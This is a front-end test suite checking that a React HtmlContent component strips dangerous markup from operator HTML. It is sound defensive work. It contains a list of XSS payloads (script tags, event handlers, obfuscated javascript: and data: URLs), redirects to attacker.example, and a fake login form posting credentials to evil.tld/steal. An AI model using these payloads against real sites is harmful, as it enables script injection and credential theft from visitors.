/*
Copyright (C) 2023-2026 QuantumNous

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.

For commercial licensing, please contact support@quantumnous.com
*/
import { afterAll, describe, test } from 'vitest'
import assert from 'node:assert/strict'

import { installBrowserEnvironment } from './browser-environment'

const domWindow = installBrowserEnvironment('https://gateway.example/')

const { act } = await import('react')
const { createRoot } = await import('react-dom/client')
const { HtmlContent } = await import('../html-content')

type RenderedContent = {
  container: HTMLDivElement
  root: ReturnType<typeof createRoot>
}

async function renderHtmlContent(content: string): Promise<RenderedContent> {
  const container = document.createElement('div')
  document.body.append(container)
  const root = createRoot(container)

  await act(async () => {
    root.render(<HtmlContent content={content} />)
  })

  return { container, root }
}

async function unmountContent(rendered: RenderedContent) {
  await act(async () => rendered.root.unmount())
  rendered.container.remove()
}

// Elements that take over the surrounding document instead of contributing
// markup: they run script, rewrite the base URL, navigate the page away, or
// host a nested browsing context.
const documentHijackingTags = new Set([
  'base',
  'embed',
  'iframe',
  'link',
  'meta',
  'object',
  'script',
])

// The invariant every operator-authored HTML surface depends on: nothing that
// reaches the DOM may execute script or navigate into a script context. Listing
// the offenders instead of returning a boolean keeps failures self-describing.
function findExecutableMarkup(container: HTMLElement): string[] {
  const findings: string[] = []

  for (const element of container.querySelectorAll('*')) {
    const tag = element.tagName.toLowerCase()

    if (documentHijackingTags.has(tag)) {
      findings.push(`<${tag}>`)
    }

    for (const attribute of element.attributes) {
      const name = attribute.name.toLowerCase()
      const value = attribute.value.replaceAll(/\s/g, '').toLowerCase()

      if (name.startsWith('on') || name === 'formaction' || name === 'srcdoc') {
        findings.push(`${tag}[${name}]`)
        continue
      }

      if (
        value.startsWith('javascript:') ||
        value.startsWith('data:text/html')
      ) {
        findings.push(`${tag}[${name}="${attribute.value}"]`)
      }
    }
  }

  return findings
}

const xssPayloads: { content: string; name: string }[] = [
  {
    content: '<script>window.__xss = true</script>',
    name: 'a bare script element',
  },
  {
    content: '<img src="x" onerror="window.__xss = true">',
    name: 'an image error handler',
  },
  {
    content: '<svg onload="window.__xss = true"></svg>',
    name: 'an svg load handler',
  },
  {
    content: '<a href="JaVaScRiPt:window.__xss=true">click</a>',
    name: 'a case-mangled javascript URL',
  },
  {
    content: '<a href="java\tscript:window.__xss=true">click</a>',
    name: 'a javascript URL split by a raw tab',
  },
  {
    content: '<a href="java&#10;script:window.__xss=true">click</a>',
    name: 'a javascript URL split by an encoded newline',
  },
  {
    content: '<iframe srcdoc="<script>window.__xss=true</script>"></iframe>',
    name: 'an iframe srcdoc document',
  },
  {
    content:
      '<form><button formaction="javascript:window.__xss=true">go</button></form>',
    name: 'a button formaction override',
  },
  {
    content:
      '<a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuX194c3M9dHJ1ZTwvc2NyaXB0Pg==">click</a>',
    name: 'a data URI navigation target',
  },
  {
    content: '<base href="https://attacker.example/">',
    name: 'a base href rewrite',
  },
  {
    content:
      '<meta http-equiv="refresh" content="0;url=https://attacker.example/">',
    name: 'a meta refresh redirect',
  },
]

// Only `_self`, `_parent`, and `_top` reuse the current browsing context.
// `_blank` and any author-chosen frame name both open a new one that inherits
// `window.opener`, so reverse tabnabbing never depended on `_blank`. The
// keywords are ASCII case-insensitive, which an attribute selector matching a
// literal value cannot express.
const linkTargets: { hardened: boolean; target: string }[] = [
  { hardened: true, target: 'evilframe' },
  { hardened: true, target: '_BLANK' },
  { hardened: false, target: '_self' },
  { hardened: false, target: '_parent' },
  { hardened: false, target: '_top' },
  { hardened: false, target: '_Top' },
]

describe('HtmlContent inline sanitization', () => {
  afterAll(() => {
    domWindow.close()
  })

  for (const payload of xssPayloads) {
    test(`drops ${payload.name} from the rendered output`, async () => {
      const rendered = await renderHtmlContent(payload.content)

      assert.deepEqual(findExecutableMarkup(rendered.container), [])

      await unmountContent(rendered)
    })
  }

  test('drops form controls without taking the surrounding footer markup with them', async () => {
    const rendered = await renderHtmlContent(
      '<p>ICP <a href="https://beian.miit.gov.cn/">12345678</a><br><strong>Support</strong> <a href="mailto:ops@example.com">ops@example.com</a></p>' +
        '<form action="https://evil.tld/steal" method="post"><input name="username"><input name="password" type="password"><textarea name="note"></textarea><select name="plan"><option>pro</option></select><button type="submit">Sign in</button></form>'
    )

    for (const control of ['button', 'form', 'input', 'select', 'textarea']) {
      assert.equal(
        rendered.container.querySelector(control),
        null,
        `<${control}> gives operator HTML a channel to submit visitor input`
      )
    }

    const paragraph = rendered.container.querySelector('p')
    assert.ok(paragraph)
    assert.ok(paragraph.querySelector('strong'))
    assert.ok(paragraph.querySelector('br'))
    assert.deepEqual(
      [...paragraph.querySelectorAll('a')].map((link) =>
        link.getAttribute('href')
      ),
      ['https://beian.miit.gov.cn/', 'mailto:ops@example.com']
    )

    await unmountContent(rendered)
  })

  test('keeps paragraphs, emphasis, line breaks, and mailto links intact', async () => {
    const rendered = await renderHtmlContent(
      '<p>Contact <strong>support</strong><br><a href="mailto:ops@example.com">ops@example.com</a></p>'
    )
    const paragraph = rendered.container.querySelector('p')

    assert.ok(paragraph)
    assert.ok(paragraph.querySelector('strong'))
    assert.ok(paragraph.querySelector('br'))
    assert.equal(
      paragraph.querySelector('a')?.getAttribute('href'),
      'mailto:ops@example.com'
    )

    await unmountContent(rendered)
  })

  test('keeps new-tab links and backfills noopener and noreferrer', async () => {
    const rendered = await renderHtmlContent(
      '<a href="https://beian.miit.gov.cn/" target="_blank">ICP 12345678</a>'
    )
    const link = rendered.container.querySelector('a')

    assert.ok(link)
    assert.equal(link.getAttribute('href'), 'https://beian.miit.gov.cn/')
    assert.equal(link.getAttribute('target'), '_blank')

    const rel = link.getAttribute('rel')?.split(/\s+/) ?? []
    assert.ok(rel.includes('noopener'))
    assert.ok(rel.includes('noreferrer'))

    await unmountContent(rendered)
  })

  for (const linkTarget of linkTargets) {
    const expectation = linkTarget.hardened
      ? 'backfills noopener and noreferrer'
      : 'leaves rel unset'

    test(`${expectation} for target="${linkTarget.target}"`, async () => {
      const rendered = await renderHtmlContent(
        `<a href="https://partner.example/" target="${linkTarget.target}">Partner</a>`
      )
      const link = rendered.container.querySelector('a')

      assert.ok(link)
      assert.equal(link.getAttribute('target'), linkTarget.target)
      assert.equal(
        link.getAttribute('rel'),
        linkTarget.hardened ? 'noopener noreferrer' : null
      )

      await unmountContent(rendered)
    })
  }

  test('backfills noopener and noreferrer on an image map hotspot', async () => {
    const rendered = await renderHtmlContent(
      '<img src="/partners.png" alt="Partners" usemap="#partners">' +
        '<map name="partners"><area shape="rect" coords="0,0,64,64" href="https://partner.example/" target="partnerframe"></map>'
    )
    const area = rendered.container.querySelector('area')

    assert.ok(area)
    assert.equal(area.getAttribute('rel'), 'noopener noreferrer')

    await unmountContent(rendered)
  })

  test('keeps the style block operators use to theme their own markup', async () => {
    const rendered = await renderHtmlContent(
      '<style>.custom-footer a { color: red; }</style><a href="/pricing">Pricing</a>'
    )

    assert.ok(rendered.container.querySelector('style'))
    assert.equal(
      rendered.container.querySelector('a')?.getAttribute('href'),
      '/pricing'
    )

    await unmountContent(rendered)
  })
})
